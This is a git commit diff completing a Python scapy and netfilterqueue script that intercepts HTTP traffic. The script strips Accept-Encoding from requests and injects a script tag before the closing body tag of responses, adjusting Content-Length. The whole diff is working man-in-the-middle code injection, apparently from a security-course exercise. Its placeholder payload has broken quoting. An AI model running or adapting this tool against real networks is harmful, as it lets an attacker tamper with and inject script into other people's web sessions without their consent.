a8a39a849da3c5a320773a63c948efe3128c8a61
Ryan Spishock <22054759+rspishock@users.noreply.github.com>
2020-08-17 06:58:38 -0400

    Complete code_injector.py and refactor code

--- code_injector.py
+++ code_injector.py
@@ -11,22 +11,35 @@ def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
     del packet[scapy.IP].chksum
-    del spacket[scapy.TCP].chksum
+    del packet[scapy.TCP].chksum
 
     return packet
 
 
 def process_packet(packet):
+    """Processes the packet and processes payload."""
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == 80:
             print('[+] Request')
-            modified_load = re.sub('Accept-Encoding:.*?\\r\\n', '', scapy_packet[scapy.Raw].load)
-            new_packet = set_load(scapy_packet, modified_load)
-            packet.set_payload(str(new_packet))
+            load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
+
         elif scapy_packet[scapy.TCP].sport == 80:
             print('[+] Response')
-            print(scapy_packet.show())
+            injection_code = '<script>alert(\'test\);</script>'
+            #Replaces the closing body tag in the HTML file with a JavaScript alert and new closing body tag
+            load = load.replace('</body>', injection_code + '</body>')
+            # matches string Content-Length <some number>, extracting only the number
+            content_length_search = re.search('(?:Content-Length:\s)(\d*)', load)
+            if content_length_search:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
